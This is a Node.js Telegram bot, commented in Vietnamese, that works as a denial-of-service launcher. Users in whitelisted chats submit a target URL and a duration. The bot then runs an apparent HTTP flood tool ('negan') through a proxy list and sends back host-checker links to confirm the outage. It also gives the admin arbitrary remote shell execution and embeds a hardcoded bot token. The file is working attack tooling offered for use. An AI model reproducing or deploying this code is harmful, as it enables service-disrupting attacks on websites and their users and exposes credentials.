const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');

const token = '7935173392:AAFYFVwBtjee7R33I64gcB3CE_-veYkU4lU';
const adminId = 1243471275;
const allowedGroupIds = new Set([-1002423723717, 987654321, 112233445, 556677889, 998877665]);
const maxTimeAttacks = 120; // Giới hạn thời gian tối đa cho mỗi lệnh
const maxSlot = 1; // Mỗi người dùng chỉ có thể chạy 1 tiến trình đồng thời

// Khởi tạo bot
const bot = new TelegramBot(token, { polling: true });

// Biến lưu trữ thông tin người dùng
const userStatus = new Map(); // Lưu trữ trạng thái người dùng: { chatId: { pid, username, startTime, command } }

// Hàm khởi động bot
const startBot = () => {
    console.log('[DEBUG] Bot is starting...');
    bot.sendMessage(adminId, '[Version PRO] 🤖 Bot is ready to receive commands.')
        .then(() => console.log('[DEBUG] Bot has started and is ready to receive commands.'))
        .catch((err) => console.error('[ERROR] Failed to send startup message:', err.message));
};

// Hàm định dạng thời gian theo múi giờ Việt Nam (GMT+7)
const getVietnamTime = () => new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' });

// Hàm gửi thông báo dưới dạng JSON kèm nút
const sendJsonMessage = async (chatId, message, buttons = []) => {
    try {
        await bot.sendMessage(chatId, JSON.stringify(message, null, 2), { parse_mode: 'HTML', reply_markup: { inline_keyboard: buttons } });
    } catch (error) {
        console.error(`[ERROR] Gửi tin nhắn thất bại: ${error.message}`);
    }
};

// Hàm thực thi lệnh
const executeCommand = async (chatId, command, host, time, username) => {
    const pid = Math.floor(Math.random() * 10000), startTime = getVietnamTime();
    const startMessage = {
        status: "🚀Successfully🚀", pid, website: host, time: `${time} Giây`, caller: username, startTime,
        checkHost: `Check Host (https://check-host.net/check-http?host=${host})`,
        hostTracker: `Host Tracker (https://www.host-tracker.com/en/ic/check-http?url=${host})`
    };
    const buttons = [
        [{ text: 'Check Host', url: `https://check-host.net/check-http?host=${host}` }],
        [{ text: 'Host Tracker', url: `https://www.host-tracker.com/en/ic/check-http?url=${host}` }]
    ];
    await sendJsonMessage(chatId, startMessage, buttons);

    // Lưu thông tin người dùng
    userStatus.set(chatId, { pid, username, startTime: Date.now(), command });

    const child = exec(command, { shell: '/bin/bash' });
    child.on('close', () => {
        const endTime = getVietnamTime();
        const completeMessage = { status: "✅Process completed✅", pid, website: host, time: `${time} Giây`, caller: username, endTime };
        sendJsonMessage(chatId, completeMessage);

        // Xóa thông tin người dùng khi lệnh hoàn thành
        userStatus.delete(chatId);
    });
};

// Xử lý lệnh từ người dùng
bot.on('message', async (msg) => {
    const chatId = msg.chat.id, text = msg.text, isAdmin = chatId === adminId, isGroup = allowedGroupIds.has(chatId);
    const username = msg.from.username || msg.from.first_name;

    // Kiểm tra quyền thực thi lệnh
    if (!isAdmin && !isGroup) return bot.sendMessage(chatId, '🚫 Bạn không có quyền thực hiện lệnh này.', { parse_mode: 'HTML' });

    // Xử lý lệnh tấn công (URL + thời gian)
    if (text.startsWith('http://') || text.startsWith('https://')) {
        const [host, time] = text.split(' ');
        if (!host || isNaN(time)) return bot.sendMessage(chatId, '🚫 Sai định dạng! Nhập theo: <URL> <time>.', { parse_mode: 'HTML' });
        if (time > maxTimeAttacks) return bot.sendMessage(chatId, `🚫 Thời gian tối đa là ${maxTimeAttacks} giây.`, { parse_mode: 'HTML' });

        // Kiểm tra số lệnh đang chạy của người dùng
        if (userStatus.has(chatId)) {
            const remainingTime = maxTimeAttacks - (Date.now() - userStatus.get(chatId).startTime) / 1000;
            return bot.sendMessage(chatId, `🚫 Bạn đang có một lệnh chạy. Vui lòng chờ tiến trình hiện tại hoàn tất. Số giây còn lại: ${Math.ceil(remainingTime)} giây.`, { parse_mode: 'HTML' });
        }

        executeCommand(chatId, `node ./negan -m GET -u ${host} -p live.txt --full true -s ${time}`, host, time, username);
        return;
    }

    // Xử lý lệnh exe (chỉ admin)
    if (text.startsWith('exe ') && isAdmin) {
        const command = text.slice(4).trim();
        if (!command) return bot.sendMessage(chatId, '🚫 Lệnh không được để trống. Ví dụ: exe ls', { parse_mode: 'HTML' });
        exec(command, { shell: '/bin/bash' }, (error, stdout, stderr) => {
            const resultMessage = `🚀 Command result:\n<pre>${command}\n${stdout || stderr}</pre>`;
            bot.sendMessage(chatId, resultMessage, { parse_mode: 'HTML' });
        });
        return;
    }

    // Lệnh không hợp lệ
    bot.sendMessage(chatId, '🚫 Lệnh không hợp lệ. Vui lòng bắt đầu lệnh với "exe" hoặc nhập URL và thời gian.', { parse_mode: 'HTML' });
});

// Xử lý lỗi không mong muốn
process.on('uncaughtException', (err) => {
    console.error('[ERROR] Uncaught Exception:', err.message);
    console.error('[DEBUG] Restarting bot...');
    startBot();
});

process.on('unhandledRejection', (err) => {
    console.error('[ERROR] Unhandled Rejection:', err.message);
    console.error('[DEBUG] Restarting bot...');
    startBot();
});

// Khởi động bot
startBot();
